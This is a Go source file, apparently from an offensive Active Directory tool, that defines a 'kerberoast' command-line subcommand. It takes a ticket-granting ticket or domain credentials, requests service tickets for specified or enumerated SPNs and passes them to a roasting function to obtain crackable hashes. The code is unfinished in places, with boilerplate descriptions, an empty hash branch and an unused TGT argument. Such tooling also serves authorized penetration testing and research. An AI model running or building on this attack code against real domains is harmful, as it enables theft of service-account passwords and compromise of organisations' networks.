/*
Copyright © 2021 NAME HERE <EMAIL ADDRESS>

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
package cmd

import (
	"fmt"

	"github.com/doubledeed-sec/gokrb5/v8/client"
	"github.com/doubledeed-sec/gokrb5/v8/messages"
	"github.com/spf13/cobra"
)

// kerberoastCmd represents the kerberoast command
var kerberoastCmd = &cobra.Command{
	Use:   "kerberoast",
	Short: "A brief description of your command",
	Long: `A longer description that spans multiple lines and likely contains examples
and usage of using your command. For example:

Cobra is a CLI library for Go that empowers applications.
This application is a tool to generate the needed files
to quickly create a Cobra application.`,
	Run: func(cmd *cobra.Command, args []string) {
		tgt, _ := cmd.Flags().GetString("tgt")
		username, _ := cmd.Flags().GetString("username")
		password, _ := cmd.Flags().GetString("password")
		domain, _ := cmd.Flags().GetString("domain")
		dcip, _ := cmd.Flags().GetString("dc-ip")
		enc, _ := cmd.Flags().GetString("enc")
		spn, _ := cmd.Flags().GetString("spn")

		kerberoast(cmd, tgt, username, password, domain, dcip, spn, enc)

	},
}

func init() {
	rootCmd.AddCommand(kerberoastCmd)

	kerberoastCmd.Flags().StringP(
		"tgt", "t", "", "Base64 encoded TGT to be used to obtain TGS",
	)
	kerberoastCmd.Flags().StringP(
		"username", "u", "", "Username to be used for kerberos authentication",
	)
	kerberoastCmd.Flags().StringP(
		"password", "p", "", "Password to be used for kerberos authentication",
	)
	kerberoastCmd.Flags().StringP(
		"domain", "d", "", "Domain to be used for kerberos authentication",
	)
	kerberoastCmd.Flags().StringP(
		"dc-ip", "", "", "IP Address of domain controller",
	)
	kerberoastCmd.Flags().StringP(
		"spn", "s", "", "SPN for which TGS will be requested",
	)
	kerberoastCmd.Flags().StringP(
		"enc", "", "rc4,aes128,aes256,desCRC,desMD5", "Encryption types, comma delimited",
	)
}

func kerberoast(kerberoastCmd *cobra.Command, tgtstring string, username string, password string, domain string, dcip string, spnstring string, enc string) {

	var cl *client.Client
	var tgt messages.ASRep

	if kerberoastCmd.Flags().Changed("tgt") {
		fmt.Println("[+] TGT Provided, using it instead of obtaining a new one")
	} else if kerberoastCmd.Flags().Changed("username") && kerberoastCmd.Flags().Changed("password") && kerberoastCmd.Flags().Changed("domain") {
		fmt.Println("[+] Credentials provided, attempting to obtain fresh TGT")
		cl = NewCl(username, password, domain, dcip, enc)
		tgt = GetTGT(cl)
	} else if kerberoastCmd.Flags().Changed("username") && kerberoastCmd.Flags().Changed("hash") && kerberoastCmd.Flags().Changed("domain") {
	} else {
		fmt.Println("Please provide either a tgt or credentials")
	}

	if kerberoastCmd.Flags().Changed("spn") {
		tgs := GetTGS(cl, tgt, spnstring, domain)
		//need to change this, with LDAP query or manually specifying TODO
		RoastTGS(tgs, "placeholder")
	} else {
		spns := getSPNs(username, password, domain, dcip)
		for _, spn := range spns {
			RoastTGS(GetTGS(cl, tgt, spn[1], domain), spn[0])
		}
	}
}
